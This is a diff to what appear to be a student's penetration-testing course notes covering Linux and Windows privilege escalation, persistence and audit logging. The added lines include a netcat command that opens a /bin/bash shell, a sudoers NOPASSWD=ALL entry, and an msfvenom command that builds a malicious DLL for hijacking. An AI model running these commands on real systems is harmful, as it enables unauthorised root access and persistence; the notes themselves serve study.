@@ -559,7 +559,9 @@ privilage esclation
     - SUID/GUID
         - execute perms as owner if its set.
         - find / -type f -perm /4000 -ls 2> /dev/null  (find all SUID bits set)
-        - https://gtfobins.github.io/  (plug in different commands) 
+        - find / -type f -perm /2000 -ls 2>/dev/null
+        - https://gtfobins.github.io/  (plug in different commands)
+        - nc <Localhost or 127.0.0.1> port -e /bin/bash 
 
 
 Insecure permissions 
@@ -578,6 +580,7 @@ Insecure permissions
   - ll , ls -latr
 - dot'.' PATH
   - echo $PATH
+    /etc/sudoers : "<name> ALL=(ALL) NOPASSWD=ALL"
 
 
 presistance
@@ -614,6 +617,55 @@ covering your tracks
 
 
 
+windows exploits 
+-----------------------------------\
+pressitance
+---------------------
+scheduled tasks -> tigger ,services -> startup , registry (boot)-> hklm..\run,runonce
+
+
+privilage esclation
+-----------------------
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+  - procmon 
+  - GetSystemDirectory() = C:\windows\system32
+  - GetWindowsDirectory() = C:\windows
+
+uac settings: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+  - aslnvoker
+  - highestAvailable
+
+logs
+  - 4964 faild logon ??
+  - application
+  - security
+  - setup
+  - system
+
+*procmon and putty is needed* 
+
+demo
+--------------
+search bar: scheduled tasks 
+search bar: services 
+fail safe mmc -> add snap in -> event viewer, services, task scheduler 
+find the exe
+view ...
+event viewer: proccessname is <name of proccess>, result is NAME NOT FOUND, path contains .dll 
+go to linops and create the dll: msfvenom -p windows/exec CMD='cmd.exe /c "<command you want>" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
+scp the dll over
+run the proccess 
+
+
+
+
+audit commands
+-----------------
+auditpol /get /category:* 
+auditpol /get /category:* | findstr /i "success failure"         *(need admin privliges)*
+event IDs 4624,4625 success and fail
+  - 4720 acc created
+event viewer use to to look at system logs 
 
 
 
